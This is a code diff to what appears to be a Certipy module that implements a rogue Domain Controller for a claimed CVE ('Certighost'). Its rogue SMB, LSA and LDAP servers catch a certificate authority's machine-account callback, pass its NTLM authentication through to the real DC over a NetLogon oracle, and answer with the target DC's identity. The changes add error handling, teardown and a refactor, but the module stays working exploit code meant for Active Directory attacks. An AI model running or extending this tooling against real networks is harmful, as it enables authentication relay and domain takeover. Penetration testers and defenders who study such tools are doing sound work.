@@ -1,24 +1,25 @@
-"""Rogue Domain Controller identity oracle for CVE-2026-54121 (Certipy).
+"""
+Rogue Domain Controller identity oracle for CVE-2026-54121 (Certighost).
 
-This module ports the rogue-listener half of the "CertiGhost" cdc-redirect
+This module ports the rogue-listener half of the "Certighost" cdc-redirect
 proof of concept into a typed Certipy library module. It stands up three
 cooperating rogue services that impersonate a Domain Controller so that a
 victim CA's machine-account callback authenticates against attacker-controlled
-infrastructure and is answered with the *target* DC's identity.
+infrastructure and is answered with the target DC's identity.
 
 Components:
-    * A rogue SMB server (impacket ``SimpleSMBServer``) whose NetLogon
-      validation is patched to set both the E and K bits of
-      ``ParameterControl`` (``0x800 | 0x20``) so that a CA hosted on a Domain
-      Controller (a server-trust account) is accepted by the real DC.
-    * A rogue LSA service over ``\\PIPE\\lsarpc`` that answers policy queries
+    - A rogue SMB server (impacket SimpleSMBServer) whose NetLogon validation is
+      patched to set both the E and K bits of ParameterControl (0x800 | 0x20) so
+      that a CA hosted on a Domain Controller (a server-trust account) is
+      accepted by the real DC.
+    - A rogue LSA service over the lsarpc named pipe that answers policy queries
       with the spoofed domain's DNS/NetBIOS/forest name, GUID and SID.
-    * A rogue LDAP server that completes an NTLMSSP bind by passing the
-      victim's authentication through to the real DC via a NetLogon
-      secure-channel oracle, then returns a single computer object carrying
-      the target DC's ``sAMAccountName``, ``dNSHostName`` and ``objectSid``.
+    - A rogue LDAP server that completes an NTLMSSP bind by passing the victim's
+      authentication through to the real DC via a NetLogon secure-channel oracle,
+      then returns a single computer object carrying the target DC's
+      sAMAccountName, dNSHostName and objectSid.
 
-The wire-level behaviour (NetLogon ``ParameterControl`` values, NTLM challenge
+The wire-level behaviour (NetLogon ParameterControl values, NTLM challenge
 flags, the sealed-LDAP framing and the hand-rolled DER/LDAP encoders) is a
 faithful port of the original PoC and must not be altered.
 """
@@ -38,9 +39,10 @@ from impacket.dcerpc.v5 import epm, lsad, nrpc, rpcrt, transport
 from impacket.dcerpc.v5.dtypes import NULL, RPC_SID
 from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY, DCERPCServer
 
+from certipy.lib.errors import handle_error
 from certipy.lib.logger import logging
 
-# Set once _patch_smb() has installed the impacket shims (see run_lsa).
+# Set once _patch_smb() has installed the impacket shims (see build_smb_lsa).
 _smb_patched = False
 
 
@@ -282,6 +284,7 @@ class NLOracle:
         t = transport.DCERPCTransportFactory(b)
         d = t.get_dce_rpc()
         d.connect()
+        self.dce = d
         syn = uuid.bin_to_uuidtup(rpcrt.DCERPC.NDRSyntax)
         d.bind(nrpc.MSRPC_UUID_NRPC, transfer_syntax=syn)
         cc = os.urandom(8)
@@ -309,7 +312,6 @@ class NLOracle:
         d.set_session_key(sk)
         resp = nrpc.hNetrLogonGetCapabilities(d, "", self.name, a)
         self.auth = resp["ReturnAuthenticator"]
-        self.dce = d
         logging.debug("Netlogon: secure channel established")
 
     def validate(self, blob: bytes, challenge: bytes) -> Tuple[bytes, int, int]:
@@ -363,6 +365,17 @@ class NLOracle:
             am["session_key"],
         )
         return sk, resp["ErrorCode"], am["flags"]
+
+    def disconnect(self) -> None:
+        """Tear down the NetLogon secure channel to the real DC, if established."""
+        if self.dce is None:
+            return
+        try:
+            self.dce.disconnect()
+        except Exception as exc:
+            logging.debug(f"Netlogon: secure-channel teardown failed: {exc!r}")
+        finally:
+            self.dce = None
 
 
 def _patch_smb() -> None:
@@ -599,7 +612,7 @@ class LSASrv(DCERPCServer):
         return self._qd(d, lsad.LsarQueryInformationPolicy2Response)
 
 
-def run_lsa(
+def build_smb_lsa(
     bind: str,
     port: int,
     nb: str,
@@ -612,13 +625,13 @@ def run_lsa(
     cpass: Optional[str],
     cdom: str,
     dcip: str,
-) -> None:
-    """Start the rogue SMB server with the rogue LSA service attached.
+) -> smbserver.SimpleSMBServer:
+    """Build the rogue SMB server with the rogue LSA service attached.
 
     Installs the impacket shims lazily, configures ``SimpleSMBServer`` with the
-    rogue machine account, registers the ``lsarpc`` named pipe pointed at a
-    :class:`LSASrv` instance, and blocks serving SMB. Intended to run on its own
-    thread.
+    rogue machine account and registers the ``lsarpc`` named pipe pointed at a
+    :class:`LSASrv` instance. The returned server is not started; the caller is
+    responsible for calling ``start()`` (which blocks) on a dedicated thread.
 
     Args:
         bind: Bind address for the SMB listener.
@@ -633,6 +646,9 @@ def run_lsa(
         cpass: Cleartext password of the rogue machine account (may be None).
         cdom: Domain for the rogue machine account.
         dcip: Real Domain Controller IP for NetLogon pass-through.
+
+    Returns:
+        The configured (but not yet started) rogue SMB server.
     """
     global _smb_patched
     if not _smb_patched:
@@ -663,7 +679,7 @@ def run_lsa(
     lsa.daemon = True
     lsa.start()
     smb.registerNamedPipe("lsarpc", ("127.0.0.1", lsa.getListenPort()))
-    smb.start()
+    return smb
 
 
 class ConnState:
@@ -822,9 +838,9 @@ class RogueLDAP:
     ) -> None:
         """Send ``data`` to the client, sealing it when the session is sealed."""
         if do_seal and st.sealed:
-            conn.send(self._seal(st, data))
+            conn.sendall(self._seal(st, data))
         else:
-            conn.send(data)
+            conn.sendall(data)
 
     def _handle_bind(
         self, conn: socket.socket, st: ConnState, mid: int, od: bytes, rs: bool
@@ -878,12 +894,17 @@ class RogueLDAP:
                         nlo.setup()
                         sk, err, fl = nlo.validate(creds, st.chal)
                     except Exception as exc:
-                        logging.debug(f"Rogue LDAP Netlogon validation: {exc!r}")
+                        logging.warning(
+                            f"Rogue LDAP: NetLogon pass-through to the DC failed: {exc}"
+                        )
+                        handle_error(is_warning=True)
                         self._send(conn, st, _lbr(mid, 49), rs)
                         return
+                    finally:
+                        nlo.disconnect()
                     if err != 0:
-                        logging.debug(
-                            f"Rogue LDAP: Netlogon rejected bind: "
+                        logging.warning(
+                            f"Rogue LDAP: NetLogon rejected the CA bind: "
                             f"0x{int(err) & 0xFFFFFFFF:08x}"
                         )
                         self._send(conn, st, _lbr(mid, 49), rs)
@@ -994,8 +1015,14 @@ class RogueLDAP:
         logging.debug(f"Rogue LDAP: binding {bind}:{port}")
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        s.bind((bind, port))
-        s.listen(8)
+        try:
+            s.bind((bind, port))
+            s.listen(8)
+        except OSError as exc:
+            logging.warning(f"Rogue LDAP failed to bind {bind}:{port}: {exc}")
+            handle_error(is_warning=True)
+            s.close()
+            return
         self._sock = s
         while not self._stop.is_set():
             try:
@@ -1072,25 +1099,36 @@ class RogueServer:
         self.smb_port = smb_port
         self.ldap_port = ldap_port
         self._ldap: Optional[RogueLDAP] = None
+        self._smb_server: Any = None
         self._smb_thread: Optional[threading.Thread] = None
         self._ldap_thread: Optional[threading.Thread] = None
 
     def _run_smb_lsa(self) -> None:
-        """Thread body: run the rogue SMB server with the LSA service (blocks)."""
-        run_lsa(
-            bind=self.listen_address,
-            port=self.smb_port,
-            nb=self.domain_netbios,
-            dns=self.domain_dns,
-            forest=self.domain_dns,
-            guid_le=self.domain_guid,
-            sid_s=self.domain_sid,
-            cname=self.machine_name,
-            chash=self.machine_nthash,
-            cpass=self.machine_password,
-            cdom=self.domain_dns,
-            dcip=self.dc_ip,
-        )
+        """Thread body: build and run the rogue SMB/LSA server (blocks)."""
+        try:
+            smb = build_smb_lsa(
+                bind=self.listen_address,
+                port=self.smb_port,
+                nb=self.domain_netbios,
+                dns=self.domain_dns,
+                forest=self.domain_dns,
+                guid_le=self.domain_guid,
+                sid_s=self.domain_sid,
+                cname=self.machine_name,
+                chash=self.machine_nthash,
+                cpass=self.machine_password,
+                cdom=self.domain_dns,
+                dcip=self.dc_ip,
+            )
+        except Exception as exc:
+            logging.warning(f"Rogue SMB/LSA failed to start: {exc}")
+            handle_error(is_warning=True)
+            return
+        self._smb_server = smb
+        try:
+            smb.start()
+        except Exception as exc:
+            logging.debug(f"Rogue SMB/LSA server stopped: {exc!r}")
 
     def start(self) -> None:
         """Start the rogue SMB/LSA and rogue LDAP listeners on daemon threads."""
@@ -1134,6 +1172,12 @@ class RogueServer:
         return False
 
     def shutdown(self) -> None:
-        """Best-effort shutdown: stop the rogue LDAP accept loop and close it."""
+        """Best-effort shutdown of the rogue LDAP and SMB/LSA listeners."""
         if self._ldap is not None:
             self._ldap.shutdown()
+        smb = self._smb_server
+        if smb is not None and hasattr(smb, "stop"):
+            try:
+                smb.stop()
+            except Exception as exc:
+                logging.debug(f"Rogue SMB/LSA shutdown failed: {exc!r}")
